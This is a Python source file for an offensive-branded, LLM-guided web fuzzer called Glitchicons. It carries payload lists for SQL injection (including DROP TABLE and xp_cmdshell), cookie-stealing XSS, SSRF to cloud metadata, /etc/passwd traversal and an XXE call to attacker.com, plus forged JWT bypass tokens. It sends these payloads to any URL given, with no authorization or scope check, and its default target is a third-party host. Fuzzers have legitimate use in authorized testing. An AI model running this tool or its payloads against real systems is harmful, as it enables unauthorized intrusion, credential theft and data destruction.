"""
GLITCHICONS ⬡ — Protocol Fuzzer Module
Decepticons Siege Division

HTTP/API fuzzer powered by LLM-guided mutation.
Targets: REST API, GraphQL, Web Applications.

Features:
- LLM generates contextual malformed requests
- Auth bypass (JWT, Bearer, Basic, API Key)
- Common vuln patterns (SQLi, XSS, SSRF, IDOR, XXE)
- Response anomaly detection (status, timing, size)
- Rate limiting awareness
- Full request/response logging
"""

import re
import json
import time
import hashlib
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import Optional
from dataclasses import dataclass, field
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import ollama
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

console = Console()

# ── FINDING DATACLASS ────────────────────────────────────────────────────────

@dataclass
class Finding:
    """A single anomalous response during fuzzing."""
    url: str
    method: str
    payload: str
    status_code: int
    response_time: float
    response_size: int
    response_snippet: str
    vuln_type: str
    severity: str
    description: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> dict:
        return self.__dict__


# ── PAYLOAD LIBRARIES ────────────────────────────────────────────────────────

# Static payloads as baseline — LLM will augment these
BASELINE_PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--",
        "' UNION SELECT NULL,NULL,NULL--", "admin'--",
        "' OR SLEEP(5)--", "1' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
        "'; EXEC xp_cmdshell('whoami')--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
        "'><script>alert(document.cookie)</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
    ],
    "ssrf": [
        "http://localhost/admin", "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd", "http://0.0.0.0:80",
        "http://[::1]/admin", "http://internal.example.com",
    ],
    "path_traversal": [
        "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    ],
    "auth_bypass": [
        "", "null", "undefined", "true", "false",
        "admin", "administrator", "root", "test",
        "' OR '1'='1", "../../admin",
    ],
    "format_string": [
        "%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n",
        "{0}", "{{7*7}}", "${7*7}", "#{7*7}",
    ],
    "overflow": [
        "A" * 100, "A" * 1000, "A" * 10000,
        "0" * 100, "-1", "99999999999999999999",
        "\x00" * 100, "\xff" * 100,
    ],
}

JWT_BYPASS_TOKENS = [
    # Algorithm confusion: none
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
    # Weak secret: 'secret'
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.2mhNFBOxc5DGjPcRR3nmYj2XNNg7EzMxNmfBWB0BKGY",
    # Empty
    "",
    # Null byte
    "null",
]

# ── LLM PROMPT TEMPLATES ─────────────────────────────────────────────────────

PROMPT_GENERATE_PAYLOADS = """You are an expert web application security researcher.

Generate {count} targeted payloads to fuzz this endpoint:
- URL: {url}
- Method: {method}
- Parameters: {params}
- Content-Type: {content_type}
- Focus: {focus}

Consider the parameter names and URL structure to generate CONTEXTUAL payloads.
For example: if param is 'user_id', focus on IDOR payloads.
If param is 'file' or 'path', focus on path traversal.
If content is JSON, generate malformed JSON.

Return ONLY the payloads, one per line, no explanation."""

PROMPT_ANALYZE_RESPONSE = """You are a security researcher analyzing HTTP responses for vulnerabilities.

Request:
{request_summary}

Response:
- Status: {status_code}
- Time: {response_time}s
- Size: {size} bytes
- Body snippet: {body_snippet}

Baseline response:
- Status: {baseline_status}
- Time: {baseline_time}s
- Size: {baseline_size} bytes

Is this response anomalous? Does it indicate a vulnerability?
If yes, respond: VULN|<type>|<severity>|<description>
If no, respond: NORMAL
Severity options: CRITICAL, HIGH, MEDIUM, LOW, INFO"""


# ── PROTOCOL FUZZER CLASS ────────────────────────────────────────────────────

class ProtocolFuzzer:
    """
    LLM-guided HTTP/API fuzzer.

    Analyzes target endpoints, generates contextual payloads,
    detects response anomalies, and logs findings.
    """

    def __init__(
        self,
        target_url: str,
        output_dir: str = "./protocol_findings",
        model: str = "qwen2.5-coder:3b",
        timeout: int = 10,
        delay: float = 0.5,
        headers: Optional[dict] = None,
        auth_token: Optional[str] = None,
    ):
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests not installed. Run: pip install requests")

        self.target_url = target_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.model = model
        self.timeout = timeout
        self.delay = delay
        self.findings: list[Finding] = []
        self.baseline: Optional[dict] = None

        # Default headers
        self.headers = {
            "User-Agent": "Glitchicons/0.2.0-dev Security Scanner",
            "Accept": "application/json, text/html, */*",
        }
        if headers:
            self.headers.update(headers)
        if auth_token:
            self.headers["Authorization"] = f"Bearer {auth_token}"

    # ── BASELINE ─────────────────────────────────────────────────────────────

    def _get_baseline(self, url: str, method: str = "GET") -> dict:
        """Get baseline response for anomaly detection."""
        try:
            start = time.time()
            r = requests.request(
                method, url,
                headers=self.headers,
                timeout=self.timeout,
                allow_redirects=True,
                verify=False
            )
            elapsed = time.time() - start
            return {
                "status": r.status_code,
                "time": round(elapsed, 3),
                "size": len(r.content),
                "body": r.text[:500],
            }
        except Exception as e:
            return {"status": 0, "time": 0, "size": 0, "body": str(e)}

    # ── LLM INTEGRATION ──────────────────────────────────────────────────────

    def _generate_payloads_llm(
        self, url: str, method: str, params: dict, focus: str, count: int = 15
    ) -> list[str]:
        """Use LLM to generate contextual payloads for this endpoint."""
        if not OLLAMA_AVAILABLE:
            return []

        prompt = PROMPT_GENERATE_PAYLOADS.format(
            count=count,
            url=url,
            method=method,
            params=json.dumps(params) if params else "none",
            content_type="application/json" if method in ["POST", "PUT", "PATCH"] else "none",
            focus=focus,
        )

        try:
            response = ollama.chat(
                model=self.model,
                messages=[{"role": "user", "content": prompt}],
                options={"temperature": 0.8, "num_predict": 1024}
            )
            raw = response["message"]["content"]
            lines = [l.strip() for l in raw.split("\n") if l.strip()]
            # Clean markdown artifacts
            lines = [re.sub(r"^```.*|```$|^\d+[\.\)]\s*|^[-*]\s*", "", l) for l in lines]
            return [l for l in lines if l]
        except Exception:
            return []

    def _analyze_response_llm(
        self, request_summary: str, response: dict, baseline: dict
    ) -> dict:
        """Use LLM to analyze if response indicates vulnerability."""
        if not OLLAMA_AVAILABLE:
            return {"is_vuln": False}

        prompt = PROMPT_ANALYZE_RESPONSE.format(
            request_summary=request_summary,
            status_code=response.get("status", 0),
            response_time=response.get("time", 0),
            size=response.get("size", 0),
            body_snippet=response.get("body", "")[:300],
            baseline_status=baseline.get("status", 0),
            baseline_time=baseline.get("time", 0),
            baseline_size=baseline.get("size", 0),
        )

        try:
            r = ollama.chat(
                model=self.model,
                messages=[{"role": "user", "content": prompt}],
                options={"temperature": 0.1, "num_predict": 256}
            )
            raw = r["message"]["content"].strip()

            if raw.startswith("VULN|"):
                parts = raw.split("|")
                return {
                    "is_vuln": True,
                    "vuln_type": parts[1] if len(parts) > 1 else "Unknown",
                    "severity": parts[2] if len(parts) > 2 else "MEDIUM",
                    "description": parts[3] if len(parts) > 3 else raw,
                }
            return {"is_vuln": False}
        except Exception:
            return {"is_vuln": False}

    # ── ANOMALY DETECTION (heuristic) ────────────────────────────────────────

    def _is_anomalous(self, response: dict, baseline: dict, payload: str) -> tuple[bool, str, str]:
        """
        Heuristic anomaly detection without LLM.
        Returns (is_anomalous, vuln_type, severity).
        """
        status = response.get("status", 0)
        b_status = baseline.get("status", 200)
        r_time = response.get("time", 0)
        b_time = baseline.get("time", 0)
        body = response.get("body", "").lower()
        size = response.get("size", 0)
        b_size = baseline.get("size", 0)

        # Status code anomalies
        if status == 500:
            return True, "Server Error / Potential Injection", "HIGH"
        if status == 200 and b_status in [401, 403]:
            return True, "Authentication Bypass", "CRITICAL"
        if status == 200 and "admin" in payload.lower():
            return True, "Potential Privilege Escalation", "HIGH"

        # Error messages in response
        error_patterns = [
            (r"sql.*error|mysql.*error|sqlite.*error|ora-\d+|postgresql", "SQL Injection", "CRITICAL"),
            (r"root:.*:/bin/|/etc/passwd", "File Inclusion / LFI", "CRITICAL"),
            (r"<script.*alert|onerror=alert", "XSS Reflection", "HIGH"),
            (r"exception.*stack.*trace|traceback|at.*\.java:\d+", "Stack Trace Disclosure", "MEDIUM"),
            (r"internal server error.*line \d+", "Error Disclosure", "MEDIUM"),
            (r"access.*denied|permission.*denied", "Access Control Issue", "MEDIUM"),
        ]
        for pattern, vtype, sev in error_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return True, vtype, sev

        # Timing anomaly (possible blind SQLi)
        if r_time > b_time + 4 and "sleep" in payload.lower():
            return True, "Blind SQL Injection (Time-Based)", "CRITICAL"

        # Size anomaly
        if b_size > 0 and size > b_size * 3:
            return True, "Response Size Anomaly (possible data leak)", "MEDIUM"

        return False, "", ""

    # ── HTTP REQUEST ─────────────────────────────────────────────────────────

    def _send_request(
        self,
        url: str,
        method: str = "GET",
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        json_data: Optional[dict] = None,
        extra_headers: Optional[dict] = None,
    ) -> dict:
        """Send HTTP request, return response dict."""
        headers = dict(self.headers)
        if extra_headers:
            headers.update(extra_headers)

        try:
            start = time.time()
            r = requests.request(
                method, url,
                headers=headers,
                params=params,
                data=data,
                json=json_data,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            elapsed = round(time.time() - start, 3)
            return {
                "status": r.status_code,
                "time": elapsed,
                "size": len(r.content),
                "body": r.text[:1000],
                "headers": dict(r.headers),
            }
        except requests.exceptions.Timeout:
            return {"status": 0, "time": self.timeout, "size": 0,
                    "body": "TIMEOUT", "headers": {}}
        except Exception as e:
            return {"status": 0, "time": 0, "size": 0,
                    "body": str(e)[:200], "headers": {}}

    # ── FUZZ METHODS ─────────────────────────────────────────────────────────

    def fuzz_params(self, endpoint: str = "", params: Optional[dict] = None) -> list[Finding]:
        """Fuzz GET query parameters."""
        url = f"{self.target_url}/{endpoint}".rstrip("/") if endpoint else self.target_url
        if not params:
            params = {"id": "1", "q": "test", "search": "hello"}

        baseline = self._get_baseline(url, "GET")
        findings = []

        console.print(f"\n[purple]⬡ Fuzzing GET params:[/purple] {url}")
        console.print(f"[dim]  Baseline: {baseline['status']} | {baseline['time']}s | {baseline['size']}b[/dim]")

        for param_name in params:
            # Determine focus based on param name
            focus = "IDOR" if any(x in param_name for x in ["id", "user", "account"]) \
                else "path traversal" if any(x in param_name for x in ["file", "path", "dir"]) \
                else "SQL injection, XSS"

            # Get LLM payloads
            llm_payloads = self._generate_payloads_llm(url, "GET", params, focus, count=10)

            # Combine static + LLM payloads
            all_payloads = []
            for category in ["sqli", "xss", "path_traversal", "overflow", "auth_bypass"]:
                all_payloads.extend(BASELINE_PAYLOADS[category][:3])
            all_payloads.extend(llm_payloads)

            for payload in all_payloads:
                test_params = dict(params)
                test_params[param_name] = payload

                resp = self._send_request(url, "GET", params=test_params)
                is_anom, vtype, sev = self._is_anomalous(resp, baseline, payload)

                if is_anom:
                    f = Finding(
                        url=url,
                        method="GET",
                        payload=f"{param_name}={payload}",
                        status_code=resp["status"],
                        response_time=resp["time"],
                        response_size=resp["size"],
                        response_snippet=resp["body"][:200],
                        vuln_type=vtype,
                        severity=sev,
                        description=f"Parameter '{param_name}' responded anomalously to payload"
                    )
                    self.findings.append(f)
                    findings.append(f)
                    self._print_finding(f)

                time.sleep(self.delay)

        return findings

    def fuzz_headers(self, endpoint: str = "") -> list[Finding]:
        """Fuzz HTTP headers — Host injection, header injection, auth bypass."""
        url = f"{self.target_url}/{endpoint}".rstrip("/") if endpoint else self.target_url
        baseline = self._get_baseline(url)
        findings = []

        console.print(f"\n[purple]⬡ Fuzzing HTTP headers:[/purple] {url}")

        header_payloads = {
            "X-Forwarded-For": ["127.0.0.1", "localhost", "0.0.0.0", "::1"],
            "X-Real-IP": ["127.0.0.1", "10.0.0.1"],
            "X-Original-URL": ["/admin", "/api/admin", "/../admin"],
            "X-Forwarded-Host": ["localhost", "evil.com"],
            "Authorization": JWT_BYPASS_TOKENS[:3] + ["Bearer invalid", "Basic YWRtaW46YWRtaW4="],
            "Content-Type": ["application/xml", "text/html", "application/x-www-form-urlencoded"],
        }

        for header_name, payloads in header_payloads.items():
            for payload in payloads:
                resp = self._send_request(url, extra_headers={header_name: payload})
                is_anom, vtype, sev = self._is_anomalous(resp, baseline, payload)

                if is_anom:
                    f = Finding(
                        url=url,
                        method="GET",
                        payload=f"{header_name}: {payload}",
                        status_code=resp["status"],
                        response_time=resp["time"],
                        response_size=resp["size"],
                        response_snippet=resp["body"][:200],
                        vuln_type=vtype,
                        severity=sev,
                        description=f"Header '{header_name}' manipulation caused anomaly"
                    )
                    self.findings.append(f)
                    findings.append(f)
                    self._print_finding(f)

                time.sleep(self.delay)

        return findings

    def fuzz_post_body(self, endpoint: str = "", template: Optional[dict] = None) -> list[Finding]:
        """Fuzz POST/JSON body parameters."""
        url = f"{self.target_url}/{endpoint}".rstrip("/") if endpoint else self.target_url
        if not template:
            template = {"username": "admin", "password": "password", "email": "test@test.com"}

        baseline = self._get_baseline(url, "POST")
        findings = []

        console.print(f"\n[purple]⬡ Fuzzing POST body:[/purple] {url}")

        for field_name in template:
            focus = "SQL injection, authentication bypass" \
                if any(x in field_name for x in ["user", "pass", "auth", "login"]) \
                else "XSS, template injection"

            llm_payloads = self._generate_payloads_llm(url, "POST", template, focus, count=10)

            all_payloads = []
            for cat in ["sqli", "xss", "format_string", "overflow"]:
                all_payloads.extend(BASELINE_PAYLOADS[cat][:3])
            all_payloads.extend(llm_payloads)

            for payload in all_payloads:
                test_body = dict(template)
                test_body[field_name] = payload

                resp = self._send_request(url, "POST", json_data=test_body)
                is_anom, vtype, sev = self._is_anomalous(resp, baseline, payload)

                if is_anom:
                    f = Finding(
                        url=url,
                        method="POST",
                        payload=f"{field_name}={payload[:80]}",
                        status_code=resp["status"],
                        response_time=resp["time"],
                        response_size=resp["size"],
                        response_snippet=resp["body"][:200],
                        vuln_type=vtype,
                        severity=sev,
                        description=f"POST field '{field_name}' responded anomalously"
                    )
                    self.findings.append(f)
                    findings.append(f)
                    self._print_finding(f)

                time.sleep(self.delay)

        return findings

    def fuzz_paths(self, wordlist: Optional[list] = None) -> list[Finding]:
        """Fuzz URL paths — directory traversal, hidden endpoints."""
        baseline = self._get_baseline(self.target_url)
        findings = []

        if not wordlist:
            wordlist = [
                "admin", "administrator", "api/admin", "api/v1/admin",
                "dashboard", "config", "backup", "test", "debug",
                ".env", ".git/config", "robots.txt", "sitemap.xml",
                "api/users", "api/v1/users", "api/v2/users",
                "swagger.json", "api-docs", "openapi.json",
                "phpinfo.php", "info.php", "server-status",
                "../etc/passwd", "../../etc/passwd",
            ]

        console.print(f"\n[purple]⬡ Fuzzing URL paths:[/purple] {self.target_url}")

        for path in wordlist:
            url = f"{self.target_url}/{path}"
            resp = self._send_request(url)

            # Path fuzzing: 200 on previously unknown paths is interesting
            if resp["status"] in [200, 201, 301, 302] and baseline["status"] != resp["status"]:
                is_anom = True
                vtype = "Hidden Endpoint Discovered"
                sev = "HIGH" if resp["status"] == 200 else "MEDIUM"
            else:
                is_anom, vtype, sev = self._is_anomalous(resp, baseline, path)

            if is_anom:
                f = Finding(
                    url=url,
                    method="GET",
                    payload=path,
                    status_code=resp["status"],
                    response_time=resp["time"],
                    response_size=resp["size"],
                    response_snippet=resp["body"][:200],
                    vuln_type=vtype,
                    severity=sev,
                    description=f"Path '{path}' returned unexpected response"
                )
                self.findings.append(f)
                findings.append(f)
                self._print_finding(f)

            time.sleep(self.delay)

        return findings

    # ── REPORTING ─────────────────────────────────────────────────────────────

    def _print_finding(self, f: Finding):
        """Print finding to terminal."""
        color = {
            "CRITICAL": "red", "HIGH": "red",
            "MEDIUM": "yellow", "LOW": "cyan", "INFO": "dim"
        }.get(f.severity, "white")

        console.print(
            f"  [{color}]⬡ {f.severity}[/{color}] [bold]{f.vuln_type}[/bold]\n"
            f"    [dim]{f.method} {f.url}[/dim]\n"
            f"    [dim]Payload: {f.payload[:60]}[/dim]\n"
            f"    [dim]Status: {f.status_code} | Time: {f.response_time}s[/dim]"
        )

    def generate_report(self) -> Path:
        """Generate markdown report of all findings."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = self.output_dir / f"protocol_findings_{timestamp}.md"

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_findings = sorted(
            self.findings,
            key=lambda f: sev_order.get(f.severity, 5)
        )

        critical = sum(1 for f in self.findings if f.severity == "CRITICAL")
        high = sum(1 for f in self.findings if f.severity == "HIGH")
        medium = sum(1 for f in self.findings if f.severity == "MEDIUM")

        report = f"""# GLITCHICONS ⬡ Protocol Fuzzer Report
**Generated:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
**Target:** {self.target_url}
**Tool:** Glitchicons v0.2.0-dev — Decepticons Siege Division

---

## Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | {critical} |
| 🟠 HIGH | {high} |
| 🟡 MEDIUM | {medium} |
| **Total** | **{len(self.findings)}** |

---

## Findings

"""
        for i, f in enumerate(sorted_findings, 1):
            report += f"""### {i}. {f.vuln_type}

| Field | Value |
|-------|-------|
| **Severity** | {f.severity} |
| **URL** | `{f.url}` |
| **Method** | {f.method} |
| **Payload** | `{f.payload[:100]}` |
| **Status Code** | {f.status_code} |
| **Response Time** | {f.response_time}s |
| **Response Size** | {f.response_size} bytes |

**Description:** {f.description}

**Response Snippet:**
```
{f.response_snippet[:300]}
```

---

"""
        report += "\n*Report generated by GLITCHICONS ⬡ — Where others probe, we siege.*\n"

        report_path.write_text(report)
        return report_path

    # ── MAIN ENTRY ────────────────────────────────────────────────────────────

    def run_full_siege(
        self,
        endpoints: Optional[list] = None,
        fuzz_params: bool = True,
        fuzz_headers: bool = True,
        fuzz_paths: bool = True,
        fuzz_post: bool = False,
    ) -> Path:
        """
        Run full fuzzing siege against target.

        Args:
            endpoints : List of API endpoints to test
            fuzz_params  : Test query parameters
            fuzz_headers : Test HTTP headers
            fuzz_paths   : Test URL paths
            fuzz_post    : Test POST body (requires manual template)

        Returns:
            Path to generated report
        """
        console.print(Panel(
            f"[bold purple]⬡ GLITCHICONS PROTOCOL FUZZER[/bold purple]\n\n"
            f"[dim]Target :[/dim] {self.target_url}\n"
            f"[dim]Model  :[/dim] {self.model}\n"
            f"[dim]Delay  :[/dim] {self.delay}s between requests\n"
            f"[dim]Output :[/dim] {self.output_dir}",
            border_style="purple"
        ))

        if not endpoints:
            endpoints = [""]

        for endpoint in endpoints:
            if fuzz_paths and not endpoint:
                self.fuzz_paths()
            if fuzz_headers:
                self.fuzz_headers(endpoint)
            if fuzz_params:
                self.fuzz_params(endpoint)
            if fuzz_post:
                self.fuzz_post_body(endpoint)

        # Generate report
        report_path = self.generate_report()

        # Summary
        console.print(f"\n[bold purple]⬡ SIEGE COMPLETE[/bold purple]")
        console.print(f"[dim]Total findings: {len(self.findings)}[/dim]")

        if self.findings:
            table = Table(show_header=True, header_style="bold purple")
            table.add_column("Severity", width=10)
            table.add_column("Type", width=35)
            table.add_column("URL", width=40)

            sev_colors = {
                "CRITICAL": "red", "HIGH": "red",
                "MEDIUM": "yellow", "LOW": "cyan"
            }
            for f in self.findings[:10]:
                color = sev_colors.get(f.severity, "white")
                table.add_row(
                    f"[{color}]{f.severity}[/{color}]",
                    f.vuln_type[:35],
                    f.url[-40:]
                )
            console.print(table)

        console.print(f"\n[green]⬡ Report saved:[/green] {report_path}")
        return report_path


# ── CLI STANDALONE ────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    # Quick demo against a local test target
    # Usage: python3 protocol_fuzzer.py http://target.com
    target = sys.argv[1] if len(sys.argv) > 1 else "http://httpbin.org"

    fuzzer = ProtocolFuzzer(
        target_url=target,
        output_dir="./protocol_findings",
        model="qwen2.5-coder:3b",
        delay=0.3,
    )

    fuzzer.run_full_siege(
        fuzz_params=True,
        fuzz_headers=True,
        fuzz_paths=True,
        fuzz_post=False,
    )
